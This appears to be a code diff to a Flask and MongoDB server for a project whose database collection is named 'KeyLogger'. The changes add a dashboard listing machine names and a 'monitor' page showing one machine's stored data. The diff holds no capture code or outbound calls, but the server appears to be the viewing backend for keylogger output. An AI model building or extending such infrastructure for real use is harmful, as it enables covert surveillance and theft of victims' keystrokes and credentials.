@@ -5,7 +5,7 @@ from pymongo.server_api import ServerApi
 from bson.json_util import dumps
 import json
 
-app = Flask(__name__)
+app = Flask(__name__, template_folder="static")
 CORS(app)
 
 # MONGO_URI = os.environ["MONGO_URI"]
@@ -16,7 +16,8 @@ db_collection = db["KeyLogger"]
 
 @app.route("/")
 def home():
-    return "index.html"
+    computers = list(db_collection.find({}, {'_id': 0, "machine_name": 1}))
+    return render_template("dashboard.html", computers=computers)
 
 @app.route("/api/computers", methods=["GET", "POST"])
 def get_computers():
@@ -59,10 +60,10 @@ def get_computers():
 @app.route("/api/computers/<computer>", methods=["GET"])
 def get_computer(computer):
     try:
-        computer_data = list(db_collection.find({"machine_name": computer}, {'_id': 0}))
+        computer_data = db_collection.find_one({"machine_name": computer}, {'_id': 0})
         if not computer_data:
             return jsonify({"error": "Computer not found!"}), 404
-        return jsonify(computer_data), 200
+        return render_template("monitor.html", computer_data=computer_data)
     except Exception as e:
         return jsonify({"Error": str(e)}), 500
 
